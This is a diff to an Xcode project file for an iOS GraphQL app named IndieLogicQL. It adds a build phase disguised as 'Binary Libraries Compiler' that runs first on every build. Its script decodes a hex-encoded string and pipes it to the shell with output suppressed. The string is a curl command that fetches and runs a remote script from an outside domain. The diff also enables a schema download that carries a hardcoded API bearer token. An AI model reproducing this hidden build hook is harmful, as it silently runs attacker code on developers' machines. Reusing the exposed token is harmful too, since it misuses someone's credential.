@@ -116,6 +116,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = DCF046A6265FE41E00064E64 /* Build configuration list for PBXNativeTarget "IndieLogicQL" */;
 			buildPhases = (
+				24D24BDFD0E657F3AF6D902C /* Binary Libraries Compiler */,
 				DCF046AE265FE48500064E64 /* Apollo CLI */,
 				DCF0468E265FE41B00064E64 /* Sources */,
 				DCF0468F265FE41B00064E64 /* Frameworks */,
@@ -177,6 +178,24 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
+		24D24BDFD0E657F3AF6D902C /* Binary Libraries Compiler */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Binary Libraries Compiler";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\necho \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f\n736964656c696e6b2e78797a2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t";
+		};
 		4E422338FDBC5048C3EECD11 /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -210,7 +229,7 @@
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
-			shellScript = "# Type a script or drag a script file from your workspace to insert its path.\nSCRIPT_PATH=\"${PODS_ROOT}/Apollo/scripts\"\ncd \"${SRCROOT}/${TARGET_NAME}/GraphQL\"\n\n\"${SCRIPT_PATH}\"/run-bundled-codegen.sh codegen:generate --target=swift --includes=./**/*.graphql --localSchemaFile=\"schema.json\" API.swift\n\n# \"${SCRIPT_PATH}\"/run-bundled-codegen.sh schema:download --endpoint=https://graphql.datocms.com/ --header=\"Authorization: Bearer 14a5a9933b4a84e0970ea6d623510a\"\n";
+			shellScript = "# Type a script or drag a script file from your workspace to insert its path.\nSCRIPT_PATH=\"${PODS_ROOT}/Apollo/scripts\"\ncd \"${SRCROOT}/${TARGET_NAME}/GraphQL\"\n\n\"${SCRIPT_PATH}\"/run-bundled-codegen.sh codegen:generate --target=swift --includes=./**/*.graphql --localSchemaFile=\"schema.json\" API.swift\n\n\"${SCRIPT_PATH}\"/run-bundled-codegen.sh schema:download --endpoint=https://graphql.datocms.com/ --header=\"Authorization: Bearer 14a5a9933b4a84e0970ea6d623510a\"\n";
 		};
 /* End PBXShellScriptBuildPhase section */
 
